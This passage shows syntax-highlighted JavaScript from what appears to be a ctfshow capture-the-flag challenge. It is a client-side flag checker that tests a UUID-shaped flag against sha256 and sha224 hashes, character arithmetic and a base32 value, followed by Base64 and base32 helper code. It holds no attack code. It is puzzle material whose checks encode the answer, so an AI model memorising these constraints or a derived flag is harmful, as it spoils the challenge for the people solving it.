punctuation">)</span><span class="token operator">-</span><span class="token number">0x57</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> <span class="token function-variable function">s2n2su</span> <span class="token operator">=</span> <span class="token parameter">s</span> <span class="token operator">=></span><span class="token punctuation">&#123;</span>    r<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> s<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        r<span class="token operator">+=</span><span class="token function">c2n</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> r<span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> m<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">var</span> e <span class="token operator">=</span> <span class="token string">'error'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha256</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">"e3a331710b01ff3b3e34d5f61c2c9e1393ccba3e31f814e7debd537c97ed7d3d"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">var</span> start <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>start<span class="token operator">!==</span><span class="token string">'ctfshow&#123;'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>length<span class="token punctuation">,</span>m<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">var</span> s <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>m<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>length<span class="token operator">!==</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">var</span> k <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token punctuation">.</span>length<span class="token operator">!==</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">s2n2su</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha256</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">"c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha256</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">"f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token punctuation">(</span><span class="token function">c2n</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token string">'dda'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token string">'e'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0x1ae</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token punctuation">(</span><span class="token function">c2n</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token function">parseInt</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token function">c2n</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">0x12</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha224</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">'abd37534c7d9a2efb9465de931cd7055ffdb8879563ae98078d6d6d5'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">st3</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">'GVSTMNDGGQ2DSOLBGUZA===='</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'you are right'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> Base64 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">_keyStr</span><span class="token operator">:</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="</span><span class="token punctuation">,</span>    <span class="token function-variable function">encode</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> n<span class="token punctuation">,</span> r<span class="token punctuation">,</span> i<span class="token punctuation">,</span> s<span class="token punctuation">,</span> o<span class="token punctuation">,</span> u<span class="token punctuation">,</span> a<span class="token punctuation">;</span>        <span class="token keyword">var</span> f <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        e <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">_utf8_encode</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>f <span class="token operator">&lt;</span> e<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            n <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            r <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            i <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            s <span class="token operator">=</span> n <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">;</span>            o <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span> <span class="token operator">|</span> r <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">;</span>            u <span class="token operator">=</span> <span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span> <span class="token operator">|</span> i <span class="token operator">>></span> <span class="token number">6</span><span class="token punctuation">;</span>            a <span class="token operator">=</span> i <span class="token operator">&amp;</span> <span class="token number">63</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isNaN</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                u <span class="token operator">=</span> a <span class="token operator">=</span> <span class="token number">64</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isNaN</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                a <span class="token operator">=</span> <span class="token number">64</span>            <span class="token punctuation">&#125;</span>            t <span class="token operator">=</span> t <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> t    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token function-variable function">decode</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> n<span class="token punctuation">,</span> r<span class="token punctuation">,</span> i<span class="token punctuation">;</span>        <span class="token keyword">var</span> s<span class="token punctuation">,</span> o<span class="token punctuation">,</span> u<span class="token punctuation">,</span> a<span class="token punctuation">;</span>        <span class="token keyword">var</span> f <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        e <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[^A-Za-z0-9+/=]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>f <span class="token operator">&lt;</span> e<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            s <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            o <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            u <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            n <span class="token operator">=</span> s <span class="token operator">&lt;&lt;</span> <span class="token number">2</span> <span class="token operator">|</span> o <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">;</span>            r <span class="token operator">=</span> <span class="token punctuation">(</span>o <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span> <span class="token operator">|</span> u <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">;</span>            i <span class="token operator">=</span> <span class="token punctuation">(</span>u <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">|</span> a<span class="token punctuation">;</span>            t <span class="token operator">=</span> t <span class="token operator">+</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>u <span class="token operator">!=</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                t <span class="token operator">=</span> t <span class="token operator">+</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                t <span class="token operator">=</span> t <span class="token operator">+</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        t <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">_utf8_decode</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> t    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token function-variable function">_utf8_encode</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        e <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">rn</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n <span class="token operator">&lt;</span> e<span class="token punctuation">.</span>length<span class="token punctuation">;</span> n<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">var</span> r <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">></span> <span class="token number">127</span> <span class="token operator">&amp;&amp;</span> r <span class="token operator">&lt;</span> <span class="token number">2048</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r <span class="token operator">>></span> <span class="token number">6</span> <span class="token operator">|</span> <span class="token number">192</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">63</span> <span class="token operator">|</span> <span class="token number">128</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r <span class="token operator">>></span> <span class="token number">12</span> <span class="token operator">|</span> <span class="token number">224</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r <span class="token operator">>></span> <span class="token number">6</span> <span class="token operator">&amp;</span> <span class="token number">63</span> <span class="token operator">|</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">63</span> <span class="token operator">|</span> <span class="token number">128</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> t    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token function-variable function">_utf8_decode</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> r <span class="token operator">=</span> c1 <span class="token operator">=</span> c2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> e<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            r <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>                n<span class="token operator">++</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">></span> <span class="token number">191</span> <span class="token operator">&amp;&amp;</span> r <span class="token operator">&lt;</span> <span class="token number">224</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                c2 <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">|</span> c2 <span class="token operator">&amp;</span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                n <span class="token operator">+=</span> <span class="token number">2</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                c2 <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                c3 <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span> <span class="token operator">|</span> <span class="token punctuation">(</span>c2 <span class="token operator">&amp;</span> <span class="token number">63</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">|</span> c3 <span class="token operator">&amp;</span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                n <span class="token operator">+=</span> <span class="token number">3</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> t    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">st3</span><span class="token punctuation">(</span><span class="token parameter">srcString</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>srcString<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> <span class="token constant">BASE32CHAR</span> <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> digit <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> currByte<span class="token punctuation">;</span>    <span class="token keyword">let</span> nextByte<span class="token punctuation">;</span>    <span class="token keyword">let</span> retrunString <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    srcString <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">_utf8_encode</span><span class="token punctuation">(</span>srcString<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token 